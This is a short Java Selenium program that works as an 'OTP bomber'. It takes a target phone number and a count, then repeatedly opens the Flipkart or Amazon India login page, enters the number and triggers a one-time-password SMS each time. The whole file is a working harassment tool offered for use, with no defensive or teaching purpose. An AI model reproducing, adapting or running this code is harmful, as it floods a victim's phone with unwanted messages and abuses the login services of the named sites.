package MultiOTP;

import java.time.Duration;
import java.util.Scanner;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;

public class Ecommerce {

	public static void main(String[] args) throws InterruptedException {
		
		System.out.print("Choose \n1.Flipkart\n2.Amazon\n>>");
		Scanner sc=new Scanner(System.in);
		int ch=sc.nextInt();
		System.out.print("Enter number of OTP want to bomb:");
		int n=sc.nextInt();
		sc.nextLine();
		System.out.print("Please Enter Target Number:");
		String num=sc.nextLine();
		int cnt=0;
		System.out.println("Countdown Started");
		//Flipkart
		if (ch==1) {
			for (int i=0;i<n;i++) {
//				System.out.print(cnt+" ");
				WebDriver driver= new ChromeDriver();
				driver.manage().window().maximize();
				driver.manage().timeouts().implicitlyWait(Duration.ofSeconds(10));
				driver.get("https://www.flipkart.com/account/login?ret=/");
				driver.findElement(By.cssSelector("input.r4vIwl")).sendKeys(num);
				driver.findElement(By.cssSelector("button.QqFHMw")).click();
				Thread.sleep(10000);
//				cnt++;
				driver.close();
			}
		}		
		//Amazon
		else if(ch==2) {
			for(int i=0;i<n;i++) {
//				System.out.print(cnt+" ");
				WebDriver driver= new ChromeDriver();
				driver.manage().window().maximize();
				driver.manage().timeouts().implicitlyWait(Duration.ofSeconds(10));
				driver.get("https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3F%26tag%3Dgooghydrabk1-21%26ref%3Dnav_signin%26adgrpid%3D155259813593%26hvpone%3D%26hvptwo%3D%26hvadid%3D674893540034%26hvpos%3D%26hvnetw%3Dg%26hvrand%3D16769615345757628510%26hvqmt%3De%26hvdev%3Dc%26hvdvcmdl%3D%26hvlocint%3D%26hvlocphy%3D9216220%26hvtargid%3Dkwd-64107830%26hydadcr%3D14452_2316413%26gad_source%3D1&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0");
				driver.findElement(By.cssSelector("input[name='email']")).sendKeys(num);
				driver.findElement(By.cssSelector("input#continue")).click();
				driver.findElement(By.cssSelector("input#continue")).click();
				Thread.sleep(10000);
//				cnt++;
				driver.close();
			}
			
		}
		
	}

}
